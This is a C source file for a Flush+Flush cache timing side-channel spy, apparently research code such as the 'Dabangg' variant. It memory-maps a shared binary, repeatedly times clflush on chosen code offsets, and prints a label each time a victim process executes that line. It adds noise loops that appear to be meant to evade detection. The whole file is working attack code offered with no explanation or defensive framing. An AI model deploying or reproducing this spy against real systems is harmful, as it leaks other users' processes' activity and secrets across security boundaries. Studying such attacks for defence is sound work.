#define _GNU_SOURCE
#include <pthread.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <stdint.h>

unsigned long start_time = 0;
unsigned long old_time = 0;

typedef struct {
    char *label;
    unsigned int offset;
} s_probe;

s_probe probes[16];
int kpause[16];
int temp_kpause[16];
int sequence[16];
size_t last_hit = 0;
size_t iter_no[16];

uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

int set_affinity(long thread_id, int cpu_id){
    cpu_set_t mask;
    int is_err;
    CPU_ZERO(&mask);
    CPU_SET(cpu_id,&mask);
    is_err = pthread_setaffinity_np(thread_id,sizeof(cpu_set_t),&mask);
}

void flush(void* p) {
    asm volatile ("clflush 0(%0)\n"
      :
      : "c" (p)
      : "rax");
}

void dabangg_flush_flush(void *addr, char *label, int i) {
    size_t time,newtime,delta;
    asm volatile ("mfence");
    asm volatile ("lfence");
    asm volatile ("rdtsc" : "=a" (time), "=d" (delta));
    time = (delta<<32) | time;
    asm volatile ("lfence");
    asm volatile ("clflush 0(%0)\n"
    :
    : "c" (addr)
    : "rax");
    asm volatile ("mfence");
    asm volatile ("lfence");
    asm volatile ("rdtsc" : "=a" (newtime), "=d" (delta));
    newtime = (delta<<32) | newtime;
    asm volatile ("lfence");
    delta = newtime - time;
    iter_no[i]++;
    if (delta >= 240 && delta <= 400 && kpause[i] > 100 && sequence[i] > 3)
    {
        kpause[i] = 0;
        sequence[i] = 0;
        if(iter_no[i]-last_hit < 1000 && last_hit)  ;
        else{
            last_hit = iter_no[i];
            printf("%s\n",label);      
        }
    }
    else if(delta >= 240 && delta <= 400){
        temp_kpause[i] = kpause[i];
        sequence[i]++;        
    }
    else if(kpause[i] - temp_kpause[i] < 5){
        kpause[i] += 1;
    }
    else{
        kpause[i] += 1;
        sequence[i] = 0;
    }
    flush(addr);
    long x, y;
    x = 5;
    y = 6;
    int max_i = 100;
    if(sequence[i]) max_i = 10;
    for (int i = 0; i < max_i; ++i){
        flush(&i);
        x *= y;
        y *=x;
        if(i%7==0){
            x = y/5.5;
            y = (x*9.2)/11;
        }
        else if(i%20==0){
            x = y%10;
            y = x%20;
        }
    }
}

int main(int argc, char **argv) {
    printf("pid: %d\n",getpid());
    if (argc < 3)
        return 1;
    char *filename = argv[1];
    char *offsetp = argv[2];
    char num_probes = 0;
    for (int i = 2; i < argc && i < 16; i++) {
        char *label = strtok(argv[i], ":");
        if (!label)
            return 2;
        char *offsetp = strtok(NULL, ":");
        if (!offsetp)
            return 2;
        unsigned int offset = 0;
        if (!sscanf(offsetp, "%x", &offset)) {
            return 2;
        }
        probes[i - 2] = (s_probe) {label, offset};
        kpause[i - 2] = 0;
        temp_kpause[i-2] = 0;
        sequence[i - 2] = 0;
        iter_no[i-2] = 0;
        num_probes += 1;
    }
    long x, y;
    x = 5;
    y = 6;
    for (int i = 0; i < 20000000; ++i){
        flush(&i);
        x *= y;
        y *=x;
        if(i%7==0){
            x = y/5.5;
            y = (x*9.2)/11;
        }
        else if(i%20==0){
            x = y%10;
            y = x%20;
        }
    }
    int fd = open(filename, O_RDONLY);
    if (fd < 3)
        return 3;
    // map the binary up to 64 MB
    unsigned char *addr = (unsigned char *) mmap(0, 64 * 1024 * 1024, PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void *) -1)
        return 4;
    start_time = rdtsc();
    while (1) {
    unsigned long time = rdtsc();
    for (int i = 0; i < num_probes; i++) {
        s_probe prb = probes[i];
        int curr_seq = sequence[i];
        dabangg_flush_flush(addr + prb.offset, prb.label, i);
        if(sequence[i]>curr_seq)    i--;
    }
    old_time = time;
    }
    return 0;
}

